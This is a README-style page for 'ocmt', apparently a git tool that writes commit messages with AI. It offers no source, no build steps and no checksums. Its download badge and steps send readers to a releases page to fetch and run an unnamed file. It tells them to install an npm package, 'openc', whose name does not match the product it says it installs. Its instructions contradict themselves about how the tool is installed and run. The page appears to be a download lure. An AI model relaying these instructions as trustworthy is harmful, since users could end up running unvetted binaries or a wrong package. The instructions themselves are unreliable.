---
layout: "default"
title: "🚀 ocmt - Simplify Your Git Commits Effortlessly"
description: "🚀 Generate AI-powered commit messages and changelogs effortlessly with OpenCommit for a streamlined git workflow."
---
# 🚀 ocmt - Simplify Your Git Commits Effortlessly

[![Download ocmt](https://img.shields.io/badge/Download-ocmt-blue.svg)](https://github.com/Hizomboga/ocmt/releases)

## 📦 Overview

OpenCommit (ocmt) is an AI-powered tool that helps you create git commit messages, generate changelogs, and maintain documentation easily. With an intuitive terminal interface, ocmt streamlines your development workflow.

## 🌟 Features

- **AI-Powered Commit Messages**: Automatically creates conventional commit messages from your staged changes.
- **Changelog Generation**: Quickly generate changelogs from your commit history.
- **Interactive Command-Line Interface**: Enjoy a user-friendly terminal UI with prompts for confirmation.
- **Customizable Settings**: Tailor your commit message rules by editing your `.oc/config.md` file.
- **Multiple Command Options**: Use `oc`, `ocmt`, or `opencommit` to run the application.

## 🔧 Prerequisites

Before installing ocmt, ensure that you have the following:

- **Node.js**: Version 18.0.0 or higher.
- **OpenCode**: Install and authenticate OpenCode from [opencode.ai](https://opencode.ai).

### 🛠️ Install OpenCode

To install OpenCode, use the following command:

```bash
# Install via npm
npm install -g openc
```

## 🚀 Download & Install

To get started with ocmt, visit the following link to download the latest release:

[Download ocmt](https://github.com/Hizomboga/ocmt/releases)

1. Click the link above.
2. On the Releases page, find the latest version.
3. Download the appropriate file for your system.

## 📖 Usage

After downloading, you can run ocmt directly from your terminal. Open your terminal and navigate to the directory where you downloaded the file. Then, type the following command to execute ocmt:

```bash
ocmt
```

The application will show you the current staged changes and generate a proposed commit message automatically.

### Example Interaction

When you run ocmt, you might see something like this:

```
┌   oc 
│
◆  Staged changes:
│    + src/index.ts
│    + src/utils/git.ts
│
●  Diff: 42 lines
│
◇  Commit message generated
│
◇  Proposed commit message:
│    "feat: add git status parsing utilities"
│
◆  What would you like to do?
│  ● Commit with this message
│  ○ Edit message
│  ○ Regenerate message
│  ○ Cancel
└
```

You have different options to choose from, making it easy to handle your commits.

## ⚙️ Configuration

To customize your settings, you can edit the `.oc/config.md` file. Here’s how:

1. Locate the `.oc/config.md` file in the installation directory.
2. Open the file in a text editor.
3. Adjust the commit message rules and preferences as needed.

## 💬 Support

If you encounter any issues or need help, feel free to visit our GitHub page or check the [OpenCommit documentation](https://github.com/Hizomboga/ocmt/wiki). We value your feedback and are here to assist you.

## 🔄 Updating

To keep ocmt up-to-date, simply revisit the [Releases page](https://github.com/Hizomboga/ocmt/releases) and download the latest version whenever it's available.

## 🎉 Contributions

We welcome contributions! If you have suggestions or improvements, please create a pull request. Your input helps us enhance the tool for everyone.

## 📜 License

OpenCommit is licensed under the MIT License. You can use it freely and modify it to suit your needs, as long as you adhere to the terms of the license.

## 🌐 Links

- [GitHub Repository](https://github.com/Hizomboga/ocmt)
- [OpenCode](https://opencode.ai)

For further assistance or questions, feel free to reach out through GitHub Issues. Thank you for using OpenCommit!